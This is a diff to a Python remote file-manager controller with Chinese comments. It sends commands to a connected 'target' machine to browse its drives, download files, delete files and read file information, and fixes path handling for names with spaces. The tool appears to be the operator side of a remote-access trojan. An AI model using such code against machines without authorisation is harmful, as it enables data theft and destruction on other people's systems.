@@ -126,20 +126,20 @@ def handle_file(target_client, addr):
         cmd = parts[0]
 
         if cmd == 'to':
-            # 导航: to C:
+            # 导航: to C:  或  to Program Files (x86)
             if len(parts) < 2:
                 print("[-] 格式：to <盘符/目录名> [子目录...]")
                 continue
-            # 如果是盘符（如 C: D:），设为根目录；否则相对于当前路径追加
-            target = parts[1]
-            if len(target) == 2 and target[1] == ':':
-                # 绝对路径：盘符
-                path = target + '\\'
+            first = parts[1]
+            if len(first) == 2 and first[1] == ':':
+                # 盘符模式: to C: Windows System32 → C:\Windows\System32\
+                path = first + '\\'
+                if len(parts) >= 3:
+                    path += '\\'.join(parts[2:]) + '\\'
             else:
-                # 相对路径：追加到当前路径
-                path = (path or '') + target + '\\'
-            if len(parts) >= 3:
-                path += parts[2].replace(' ', '\\') + '\\'
+                # 目录名模式: to Program Files (x86) → 保留空格
+                dirname = ' '.join(parts[1:]).strip('\'"')
+                path = (path or '') + dirname + '\\'
             # 导航后自动列出目录
             target_client.send(f"look {path}".encode())
             len_data = recv_exact(target_client, 8)
@@ -177,7 +177,7 @@ def handle_file(target_client, addr):
                 continue
             # 列出子目录: look subdir
             if len(parts) >= 2:
-                look_path = path + parts[1] + '\\'
+                look_path = path + ' '.join(parts[1:]).strip('\'"') + '\\'
             else:
                 look_path = path
             target_client.send(f"look {look_path}".encode())
@@ -197,7 +197,7 @@ def handle_file(target_client, addr):
             if len(parts) < 2:
                 print("[-] 格式：get <文件名>")
                 continue
-            file_path = path + parts[1]
+            file_path = path + ' '.join(parts[1:]).strip('\'"')
             target_client.send(f"get {file_path}".encode())
             # 接收文件大小（-1 表示客户端读取失败）
             file_size = int(recv_exact(target_client, 8).decode())
@@ -220,12 +220,26 @@ def handle_file(target_client, addr):
             if len(parts) < 2:
                 print("[-] 格式：delete <文件名>")
                 continue
-            file_path = path + parts[1]
+            file_path = path + ' '.join(parts[1:]).strip('\'"')
             target_client.send(f"delete {file_path}".encode())
             print(f"[{addr}] {file_path} 已删除")
-
+        elif cmd == 'information':
+            if not path:
+                print("[-] 尚未导航，请先用 to 命令")
+                continue
+            if len(parts) < 2:
+                print("[-] 格式：information <文件名>")
+                continue
+            file_path = path + ' '.join(parts[1:]).strip('\'"')
+            target_client.send(f"information {file_path}".encode())
+            # 按协议：先收8字节长度头，再收实际数据
+            len_data = recv_exact(target_client, 8)
+            info_len = int(len_data.decode())
+            info_data = recv_exact(target_client, info_len)
+            file_information = info_data.decode('gbk', errors='ignore')
+            print(f"[{addr}] {file_path} 文件信息：\n{file_information}")
         else:
-            print("[-] 未知命令，支持：to / back / look / get / delete / 0")
+            print("[-] 未知命令，支持：to / back / look / get / delete / information /0")
 
         
 
